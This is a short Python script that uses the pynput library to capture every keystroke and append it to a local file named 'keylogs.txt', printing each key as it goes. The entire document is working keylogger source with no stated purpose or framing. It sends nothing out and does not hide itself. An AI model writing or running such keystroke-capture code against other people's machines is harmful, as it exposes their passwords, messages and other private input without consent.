import pynput
from pynput import keyboard
def on_key_press(key):
    log_file_name = 'keylogs.txt'
    try:
        with open(log_file_name, 'a', encoding='utf-8') as log_file:
            if hasattr(key, 'char'):
                log_file.write(key.char)
                print(f'Alphanumeric key pressed: {key.char}')
            else:
                log_file.write(str(key))
                print(f'Special key pressed: {str(key)}')
    except Exception as e:
        print(f'Error logging key: {e}')
with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
